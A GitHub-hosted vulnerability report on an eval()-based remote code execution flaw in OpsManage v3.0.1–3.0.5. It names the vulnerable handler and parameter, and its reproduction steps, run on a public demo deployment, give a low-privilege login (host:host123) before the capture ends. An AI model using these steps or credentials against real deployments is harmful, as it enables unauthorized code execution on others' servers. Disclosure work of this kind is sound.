=== Content from github.com_c2669ad7_20250114_203648.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSp1d3rL1%2FOpsManage_RCE%2Fblob%2Fmain%2FOpsManage%2520RCE.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSp1d3rL1%2FOpsManage_RCE%2Fblob%2Fmain%2FOpsManage%2520RCE.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Sp1d3rL1%2FOpsManage_RCE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Sp1d3rL1](/Sp1d3rL1)
/
**[OpsManage\_RCE](/Sp1d3rL1/OpsManage_RCE)**
Public

* [Notifications](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE)
* [Star
   0](/login?return_to=%2FSp1d3rL1%2FOpsManage_RCE)

* [Code](/Sp1d3rL1/OpsManage_RCE)
* [Issues
  0](/Sp1d3rL1/OpsManage_RCE/issues)
* [Pull requests
  0](/Sp1d3rL1/OpsManage_RCE/pulls)
* [Actions](/Sp1d3rL1/OpsManage_RCE/actions)
* [Projects
  0](/Sp1d3rL1/OpsManage_RCE/projects)
* [Security](/Sp1d3rL1/OpsManage_RCE/security)
* [Insights](/Sp1d3rL1/OpsManage_RCE/pulse)

Additional navigation options

* [Code](/Sp1d3rL1/OpsManage_RCE)
* [Issues](/Sp1d3rL1/OpsManage_RCE/issues)
* [Pull requests](/Sp1d3rL1/OpsManage_RCE/pulls)
* [Actions](/Sp1d3rL1/OpsManage_RCE/actions)
* [Projects](/Sp1d3rL1/OpsManage_RCE/projects)
* [Security](/Sp1d3rL1/OpsManage_RCE/security)
* [Insights](/Sp1d3rL1/OpsManage_RCE/pulse)

## Files

 main
## Breadcrumbs

1. [OpsManage\_RCE](/Sp1d3rL1/OpsManage_RCE/tree/main)
/
# OpsManage RCE.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Sp1d3rL1/OpsManage_RCE/commits/main/OpsManage%20RCE.md)96 lines (71 loc) · 5.72 KB main
## Breadcrumbs

1. [OpsManage\_RCE](/Sp1d3rL1/OpsManage_RCE/tree/main)
/
# OpsManage RCE.md

Top
## File metadata and controls

* Preview
* Code
* Blame

96 lines (71 loc) · 5.72 KB[Raw](https://github.com/Sp1d3rL1/OpsManage_RCE/raw/refs/heads/main/OpsManage%20RCE.md)
# BUG\_Author

YiLin Li

# Affected version

v3.0.1 ≤ OpsManage ≤ v3.0.5

# Vender

github.com/welliamcao/OpsManage

# Software

[![image](https://private-user-images.githubusercontent.com/65012958/387531564-cf835272-cb75-49a8-abf4-ba187b6f9cf4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MzE1NjQtY2Y4MzUyNzItY2I3NS00OWE4LWFiZjQtYmExODdiNmY5Y2Y0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI5YTk1NjY2MThiY2E5OTgyOTFlN2M2MTljOWJkYWEzYzI3NDE5NDYzNzhiOTYwYjIxNGE4YjA2ZmZkZGU3ZTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.U3q130CJgZnw4mS3b4GSyHOMvsavqtd3BkIMAuYczuA)](https://private-user-images.githubusercontent.com/65012958/387531564-cf835272-cb75-49a8-abf4-ba187b6f9cf4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MzE1NjQtY2Y4MzUyNzItY2I3NS00OWE4LWFiZjQtYmExODdiNmY5Y2Y0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI5YTk1NjY2MThiY2E5OTgyOTFlN2M2MTljOWJkYWEzYzI3NDE5NDYzNzhiOTYwYjIxNGE4YjA2ZmZkZGU3ZTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.U3q130CJgZnw4mS3b4GSyHOMvsavqtd3BkIMAuYczuA)

# Vulnerability File

./apps/api/views/deploy\_api.py

# Description

The **OpsManage Automated Management Platform** contains a remote code execution vulnerability. Attackers can bypass parameter validation, allowing OpsManage to remotely execute arbitrary Python code.
This vulnerability exists in the file **./apps/api/views/deploy\_api.py**. In the `deploy_host_vars()` function, when this handler receives an HTTP POST request, if the **`id`** parameter results in a non-empty SQL query, the **`host_vars`** variable will accept the parameters from the request, passing external data into the `eval()` function for execution, ultimately leading to the vulnerability.

## Status

Critical

## Code Analysis

In the latest version (v3.0.5), it is observed that the function `deploy_host_vars(request, id, format=None)` in the file **/apps/api/views/deploy\_api.py** is an API endpoint that accepts both GET and POST requests.

The route for this handler consists of two parts, and the final complete route looks like this: `/api/host/vars/123/` (where 123 is the id).

**Part1：**
[![image](https://private-user-images.githubusercontent.com/65012958/387508660-71e2d6ce-4398-4a86-825b-47a891f6b91f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDg2NjAtNzFlMmQ2Y2UtNDM5OC00YTg2LTgyNWItNDdhODkxZjZiOTFmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThmNTBiNWU0ZjViZjU4OTBiNWViOTQzMmRmYjdjYjliZmU5YWUyN2FlOTMxMzNlYTkxOWM5YTM0YWRkZTcxZDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.2bEKxW-h6pA9loetTxFsoMbPK2XRnnnb9nqNGnlfIws)](https://private-user-images.githubusercontent.com/65012958/387508660-71e2d6ce-4398-4a86-825b-47a891f6b91f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDg2NjAtNzFlMmQ2Y2UtNDM5OC00YTg2LTgyNWItNDdhODkxZjZiOTFmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThmNTBiNWU0ZjViZjU4OTBiNWViOTQzMmRmYjdjYjliZmU5YWUyN2FlOTMxMzNlYTkxOWM5YTM0YWRkZTcxZDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.2bEKxW-h6pA9loetTxFsoMbPK2XRnnnb9nqNGnlfIws)

**Part2：**
[![image](https://private-user-images.githubusercontent.com/65012958/387508042-0dee9673-6ac5-495b-b9bd-4c1d0cd91ad6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDgwNDItMGRlZTk2NzMtNmFjNS00OTViLWI5YmQtNGMxZDBjZDkxYWQ2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWYwMDNmNWRlODE3YzJlZmI3ZDI3Yjk2ZmU2Njg5MzUyYjQ2NDhiYWM0N2M0NDI0ZWE0NGFlNjdiOTk2NzkyOGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ITwxkcfIV8eiWEZvK-1OEVzdplGxtsJ2J162YtgUONg)](https://private-user-images.githubusercontent.com/65012958/387508042-0dee9673-6ac5-495b-b9bd-4c1d0cd91ad6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDgwNDItMGRlZTk2NzMtNmFjNS00OTViLWI5YmQtNGMxZDBjZDkxYWQ2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWYwMDNmNWRlODE3YzJlZmI3ZDI3Yjk2ZmU2Njg5MzUyYjQ2NDhiYWM0N2M0NDI0ZWE0NGFlNjdiOTk2NzkyOGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ITwxkcfIV8eiWEZvK-1OEVzdplGxtsJ2J162YtgUONg)

In the first try..except block, the model Assets queries the **`id`** parameter to ensure that the **`id`** exists; otherwise, it will return a 404 page.
[![image](https://private-user-images.githubusercontent.com/65012958/387494256-b15e8ce6-9e68-42b9-8dac-adadcd16ad1a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc0OTQyNTYtYjE1ZThjZTYtOWU2OC00MmI5LThkYWMtYWRhZGNkMTZhZDFhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY0ZTU0NTUyMmMyZTRhNjM2ZTBlOWQ1ZGZhOTdjNzBhZDhlNDgxMmFiMzk1ZmE2NDk1ZjBiNTUzZTBjZTZhOWMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.N8DRockegSOWlk6KaIPkNphYm4RpyRs5Kll8TSyUzIw)](https://private-user-images.githubusercontent.com/65012958/387494256-b15e8ce6-9e68-42b9-8dac-adadcd16ad1a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc0OTQyNTYtYjE1ZThjZTYtOWU2OC00MmI5LThkYWMtYWRhZGNkMTZhZDFhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY0ZTU0NTUyMmMyZTRhNjM2ZTBlOWQ1ZGZhOTdjNzBhZDhlNDgxMmFiMzk1ZmE2NDk1ZjBiNTUzZTBjZTZhOWMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.N8DRockegSOWlk6KaIPkNphYm4RpyRs5Kll8TSyUzIw)

This check is easy to bypass, and I will explain the bypass method in **Trigger the vulnerability**.

And then, when a POST request is made with the **`host_vars`** parameter, the variable **`host_vars`** will receive its value. The vulnerability is triggered at this point, as the value is then passed to `eval()` for execution as code.

[![image](https://private-user-images.githubusercontent.com/65012958/387491450-d291dfdb-184d-41d4-bba2-0a9713d6bd46.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc0OTE0NTAtZDI5MWRmZGItMTg0ZC00MWQ0LWJiYTItMGE5NzEzZDZiZDQ2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI2OTUyNDExYzEzYWQ5ZmFiZWNkOTI2NDZjMjgwMzA3MjliN2U1YjM1MTk0ODUxZTE5NDQzNzIzMWViNTZkZWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.k7Uc3aXNbr04grZPlTMNXzrkkqM3cC9-9hGSaswGQXY)](https://private-user-images.githubusercontent.com/65012958/387491450-d291dfdb-184d-41d4-bba2-0a9713d6bd46.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc0OTE0NTAtZDI5MWRmZGItMTg0ZC00MWQ0LWJiYTItMGE5NzEzZDZiZDQ2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI2OTUyNDExYzEzYWQ5ZmFiZWNkOTI2NDZjMjgwMzA3MjliN2U1YjM1MTk0ODUxZTE5NDQzNzIzMWViNTZkZWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.k7Uc3aXNbr04grZPlTMNXzrkkqM3cC9-9hGSaswGQXY)

## Trigger the vulnerability

After deploying the environment locally, the process appears quite complex, making it difficult to reproduce the vulnerability. Fortunately, I discovered an official public deployment of the system, so the following process will be carried out on the public deployment.
[![image](https://private-user-images.githubusercontent.com/65012958/387497214-73d30fae-db2b-4c68-892e-5baeb821aa79.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc0OTcyMTQtNzNkMzBmYWUtZGIyYi00YzY4LTg5MmUtNWJhZWI4MjFhYTc5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTZjMmE1OGE5MzI0Zjg4ZjA0OWFmNzM3OTNmYTIyOWE3NDE5MjUzNWU0NmUyNDFiN2U3ZmRiZDBhN2U5MDU1NWMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.0oIn4GeJADj5zJiMwq42SO3hTmr93ZcAkNbLwSVJZC8)](https://private-user-images.githubusercontent.com/65012958/387497214-73d30fae-db2b-4c68-892e-5baeb821aa79.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc0OTcyMTQtNzNkMzBmYWUtZGIyYi00YzY4LTg5MmUtNWJhZWI4MjFhYTc5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTZjMmE1OGE5MzI0Zjg4ZjA0OWFmNzM3OTNmYTIyOWE3NDE5MjUzNWU0NmUyNDFiN2U3ZmRiZDBhN2U5MDU1NWMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.0oIn4GeJADj5zJiMwq42SO3hTmr93ZcAkNbLwSVJZC8)

Log in to the system using the demo account and open the user management interface. I have already added a low-privilege, login-only user named 'host' (with the password host123) using the demo account.
[![image](https://private-user-images.githubusercontent.com/65012958/387503449-5276db9b-4640-4d43-999e-247adb50b1ad.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDM0NDktNTI3NmRiOWItNDY0MC00ZDQzLTk5OWUtMjQ3YWRiNTBiMWFkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRkMGY0OTliNTJlZDM5Nzc4ODVhYmFlYjUxOTJlY2NlYzg1MTkxOWM4YWJlMDcwYmYwYmU2ZjIyZmIzNjRlMzUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.n9NbjAnVo17_NubN6S0xwmft-q9DvtwfAnn5veNauBo)](https://private-user-images.githubusercontent.com/65012958/387503449-5276db9b-4640-4d43-999e-247adb50b1ad.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDM0NDktNTI3NmRiOWItNDY0MC00ZDQzLTk5OWUtMjQ3YWRiNTBiMWFkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRkMGY0OTliNTJlZDM5Nzc4ODVhYmFlYjUxOTJlY2NlYzg1MTkxOWM4YWJlMDcwYmYwYmU2ZjIyZmIzNjRlMzUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.n9NbjAnVo17_NubN6S0xwmft-q9DvtwfAnn5veNauBo)

Clicking the 🚫 icon on the right of the role shows the assigned permissions for that role. We can see that the 'host' user has no permissions assigned.
[![image](https://private-user-images.githubusercontent.com/65012958/387504787-d1f3587d-1075-4d0a-b5f5-06faa21e70df.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDQ3ODctZDFmMzU4N2QtMTA3NS00ZDBhLWI1ZjUtMDZmYWEyMWU3MGRmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQwNTI1YzdiYTc0YzhlMGUxZGU1MWIyNGYxMjhiOWU0YmM4Nzg4NzYwOGFlMGUzZGIyZWQ3NmU2MmZmNzQxNGYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.h4XiNNHexP4xUNlBIqUUjlf6uGHLvkBcpWCFLbIM0O8)](https://private-user-images.githubusercontent.com/65012958/387504787-d1f3587d-1075-4d0a-b5f5-06faa21e70df.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczMDYsIm5iZiI6MTczNjg4NzAwNiwicGF0aCI6Ii82NTAxMjk1OC8zODc1MDQ3ODctZDFmMzU4N2QtMTA3NS00ZDBhLWI1ZjUtMDZmYWEyMWU3MGRmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMzY0NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQwNTI1YzdiYTc0YzhlMGUxZGU1MWIyNGYxMjhiOWU0YmM4Nzg4NzYwOGFlMGUzZGIyZWQ3NmU2MmZmNzQxNGYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.h4XiNNHexP4xUNlBIqUUjlf6uGHLvkBcpWCFLbIM0O8)

Log in to the system using **host:host123** and simultaneously capture the **csrftoken** from the `/login/` endpoint in BurpSuite.
